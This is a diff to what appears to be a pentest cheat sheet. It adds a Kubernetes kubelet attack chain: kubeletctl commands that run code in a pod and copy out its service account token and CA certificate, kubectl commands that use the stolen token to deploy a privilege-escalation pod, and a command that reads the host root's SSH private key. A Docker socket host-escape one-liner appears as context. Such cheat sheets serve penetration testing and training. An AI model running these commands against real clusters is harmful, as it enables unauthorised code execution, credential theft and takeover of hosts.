@@ -2023,7 +2023,16 @@ $ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mn
 ```
 $ curl https://<IP address>:6443 -k
 $ curl https://<IP address>:10250/pods -k | jq .
-
+$ kubeletctl -i --server <IP address> pods
+$ kubeletctl -i --server <IP address> scan rce
+$ kubeletctl -i --server <IP address> exec "id" -p nginx -c nginx
+$ kubeletctl -i --server <IP address> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+$ kubeletctl -i --server <IP address> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+$ export token=`cat k8.token`
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP address>:6443 auth can-i --list
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP address>:6443 apply -f privesc.yaml
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP address>:6443 get pods
+$ kubeletctl --server <IP address> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
 ```
 
 - Disk Group
